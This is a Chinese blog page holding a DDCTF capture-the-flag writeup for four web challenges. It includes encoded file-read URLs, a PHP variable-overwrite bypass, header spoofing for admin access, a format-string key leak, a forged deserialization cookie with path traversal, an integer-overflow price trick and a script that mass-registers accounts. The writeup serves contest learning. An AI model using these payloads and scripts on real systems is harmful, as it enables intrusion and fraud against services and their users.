@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            DDCTF 部分题目 Writeup
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%BB%B4"><span class="toc-text">Web - 滴~</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-WEB%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">Web - WEB签到题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Upload-IMG"><span class="toc-text">Web - Upload-IMG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E5%A4%8D%E7%8E%B0-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9-%E4%BB%8A%E6%99%9A%E5%90%83%E9%B8%A1"><span class="toc-text">Web - 复现 - 大吉大利,今晚吃鸡~</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p><em>这次DDCTF真的是学到很多东西，希望后面可以多多参加比赛锻炼自己。</em></p>
+<h2 id="Web-滴"><a href="#Web-滴" class="headerlink" title="Web - 滴~"></a>Web - 滴~</h2><p>地址：<a target="_blank" rel="noopener" href="http://117.51.150.246/">http://117.51.150.246/</a></p>
+<p>BASE64解码两次jpg参数的值：666C61672E6A7067</p>
+<p>再经过一次16进制转字符串：flag.jpg</p>
+<p>可知页面读取文件的名称是先经过两次BASE64解码再经过一次进制转换得到的。</p>
+<p>尝试读取index.php:</p>
+<p><code>http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p>
+<p>页面返回得到data协议里的经过BASE64处理后的数据，解码后得到源码：</p>
+<a id="more"></a>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>].<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="variable">$txt</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<!-- more -->
+<p>这里可以看到，$file经过的处理步骤为：</p>
+<ol>
+<li>jpg参数的值经过两次base64加密，一次进制转换。</li>
+<li>使用preg_replace()函数将除了字母数字外的字符删除</li>
+<li>将变量中<code>config</code>替换为<code>!</code></li>
+</ol>
+<p>题目中还给了提示<code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p>
+<p>看了之后我一直以为是要绕过preg_replace()提交一个<code>\b</code>来构造参数值来读取config.php，无果。</p>
+<p>后来经过别人提示才知道，博客的博主的另外一篇帖子提到的<a target="_blank" rel="noopener" href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909">vim 异常退出 swp文件提示</a></p>
+<p>读取practice.txt.swp:</p>
+<p><code>http://117.51.150.246/index.php?jpg=TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0=</code></p>
+<p>获得了一个文件名：f1ag!ddctf.php 访问后发现没有东西，直接读这个文件的源码：</p>
+<p>emmm,发现<code>f1ag!ddctf.php</code>被过滤成<code>f1agddctf.php</code>，因为str_replace()会把config替换为!，所以就直接把读取的文件名设为<code>f1agconfigddctf.php</code>，成功读取到源码：</p>
+<p><code>http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$uid</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$uid</span>==<span class="variable">$content</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>变量覆盖，判断变量uid和文件名为变量k的文件内容是否相同。</p>
+<p>一开始想着应该是弱类型，但后来发现不是。</p>
+<p>如果文件不存在的话，读取到的内容就为空，所以uid赋值为空，k为一个不存在的文件名，访问：</p>
+<p><code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=333</code></p>
+<p>得到Flag。</p>
+<p>(因为网站存在robots.txt，内容为<code>excuse me?</code>， 我尝试访问：<code>http://117.51.150.246/f1ag!ddctf.php?uid=excuse%20me?&amp;k=robots.txt</code> 不知道为什么不成功)</p>
+<h2 id="Web-WEB签到题"><a href="#Web-WEB签到题" class="headerlink" title="Web - WEB签到题"></a>Web - WEB签到题</h2><p>题目地址：<a target="_blank" rel="noopener" href="http://117.51.158.44/">http://117.51.158.44/</a></p>
+<p>网页提示：<code>抱歉，您没有登陆权限，请获取权限后访问-----</code></p>
+<p>发现，弹出<code>需要授权</code>，他提示该网站称：<code>restricted username</code></p>
+<p>尝试了几个弱口令，不行。</p>
+<p>在index.php页面的源码中发现了一个js：<code>http://117.51.158.44/js/index.js</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: didi</span></span><br><span class="line"><span class="comment"> * Date: 2019/1/13</span></span><br><span class="line"><span class="comment"> * Time: 9:05 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        url:<span class="string">&quot;http://117.51.158.44/app/Auth.php&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&quot;application/json;charset=utf-8&quot;</span>,</span><br><span class="line">        dataType: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">&quot;didictf_username&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">&#x27;auth&#x27;</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>给<code>http://117.51.158.44/app/Auth.php</code>发了一个POST请求，并且http头包含<code>didictf_username</code></p>
+<p>用Brupsuite包含<code>Didictf_Username: admin</code>像Auth.php提交一个POST请求,返回：</p>
+<p><code>&#123;errMsg:success,data:您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#125;</code></p>
+<p>访问<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>得到两份PHP代码，看来是又要审计？</p>
+<p>将源码理了一下，之后搜索到了<a target="_blank" rel="noopener" href="https://juejin.im/post/5aa1154d6fb9a028de4448d2">Codeigniter 利用加密Key（密钥）的对象注入漏洞</a></p>
+<p>读完文章之后的思路就是：</p>
+<ol>
+<li>拿到eancrykey</li>
+<li>通过反序列化修改<code>$this-&gt;path</code></li>
+<li>读取flag</li>
+</ol>
+<p>源码中可以看到eancrykey是通过读取<code>../config/key.txt</code>得到的，后面存在一个判断：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;nickname&quot;</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$data</span> = sprintf(<span class="variable">$data</span>,<span class="variable">$v</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">parent</span>::response(<span class="variable">$data</span>,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用POST提交<code>nickname=123 %s</code>.(需要将添加cookie值)</p>
+<p>因为这里$data变量经过了两次sprintf处理，只有在值里面添加s%，才能把eancrykey读出来。</p>
+<p>eancrykey的值为：<code>EzblrbNS</code>, 当时的截图：</p>
+<p><img src="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg" alt="eancrykey"></p>
+<p>根据文章里面的方法，构造反序列化的payload，源码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;path = <span class="string">&quot;....//config/flag.txt&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$session</span> = serialize(<span class="keyword">new</span> Application);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$session</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$private_key</span> = <span class="string">&#x27;EzblrbNS&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5(<span class="variable">$private_key</span>.<span class="variable">$session</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成的payload为：<code>O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;&#125;77cd55a8d29df4f005f85e536d876525</code> (记得将payload url编码)</p>
+<p>flag的地址是因为源码中的提示：<code>eancrykey  and flag under the folder</code>, 又因为$path会经过处理，会将”../“删除，所以双写”../“。最后发现path的长度刚刚18。</p>
+<p>将cookie值改为payload，就可以读取到flag。</p>
+<h2 id="Web-Upload-IMG"><a href="#Web-Upload-IMG" class="headerlink" title="Web - Upload-IMG"></a>Web - Upload-IMG</h2><p>这里考了一个没有接触过的点，二次渲染。</p>
+<p>这里上传的是一个JPG文件，先把jpg上传然后保存下来。</p>
+<p>使用脚本直接跑一下JPG图片，再次上传得到Flag。</p>
+<p>脚本来自：<a target="_blank" rel="noopener" href="https://paper.tuisec.win/detail/39553671bf72998">https://paper.tuisec.win/detail/39553671bf72998</a></p>
+<p>生成payload_jpg:</p>
+<p><img src="https://i.loli.net/2019/04/19/5cb9c9ab5c898.jpg" alt="xuanran"></p>
+<p>得到Flag：</p>
+<p><img src="https://i.loli.net/2019/04/19/5cb9c9ab02154.jpg" alt="xuanran"></p>
+<h2 id="Web-复现-大吉大利-今晚吃鸡"><a href="#Web-复现-大吉大利-今晚吃鸡" class="headerlink" title="Web - 复现 - 大吉大利,今晚吃鸡~"></a>Web - 复现 - 大吉大利,今晚吃鸡~</h2><p>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</p>
+<p>发现只有100元，但买票需要2000元。</p>
+<p>我当时尝试过修改价钱，没绕过去，看了wp之后才知道是用整数溢出来绕过。</p>
+<p>购买链接为：<code>/ctf/api/buy_ticket?ticket_price=2000</code></p>
+<p>将ticket_price修改为：4294967297 (在32位系统下，所有无符号整数的数量是2^32=4294967296)</p>
+<p>提交，然后支付，购买成功并且只花了一元钱。</p>
+<p>在游戏里面提示：通过提交正确id与ticket来移除对手</p>
+<p>这里需要写一个脚本，批量注册，购买入场票，获得ID和ticket。然后用这个账户来移除。</p>
+<p>这里借用一个大佬的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">X = requests.Session()</span><br><span class="line">X.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/register?name=admintest4&amp;password=admintest&quot;</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># time.sleep(0.1)</span></span><br><span class="line">    R = requests.Session()</span><br><span class="line">    <span class="comment"># reg</span></span><br><span class="line">    reg_res = R.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/register?name=Sndav0&#123;&#125;&amp;password=12345678&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="comment"># if &quot;200&quot; in reg_res.text:</span></span><br><span class="line">    <span class="comment">#     # print(&quot;Sndav&#123;&#125; is registed pass:12345678&quot;.format(i));</span></span><br><span class="line">    buy_res = R.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967299&quot;</span>)    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bill_id = json.loads(buy_res.text)</span><br><span class="line">        bill_id = bill_id[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;bill_id&#x27;</span>]</span><br><span class="line">        <span class="comment"># print(&quot;billid:&quot;+bill_id);</span></span><br><span class="line">        buy2_res = R.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(bill_id))</span><br><span class="line">        <span class="comment"># print(json.loads(buy2_res.text)[u&#x27;code&#x27;])</span></span><br><span class="line">        <span class="comment"># get_token</span></span><br><span class="line">        token_res = R.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;</span>)</span><br><span class="line">        js = json.loads(token_res.text)[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(js)</span></span><br><span class="line">        <span class="built_in">id</span> = js[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        ticket = js[<span class="string">&#x27;ticket&#x27;</span>]</span><br><span class="line">        print(<span class="built_in">id</span>,ticket)</span><br><span class="line">        X.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>,ticket))</span><br><span class="line">        print(X.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/get_flag&quot;</span>).text)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>直接跑，返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">141 c8f034432be513ace9e8452f8af78d89</span><br><span class="line">&#123;&quot;code&quot;:200,&quot;data&quot;:[&quot;DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;&quot;],&quot;msg&quot;:&quot;\u5927\u5409\u5927\u5229\uff0c\u4eca\u665a\u5403\u9e21&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题的收获应该是了解了整数溢出，后面也可以总结一下。</p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
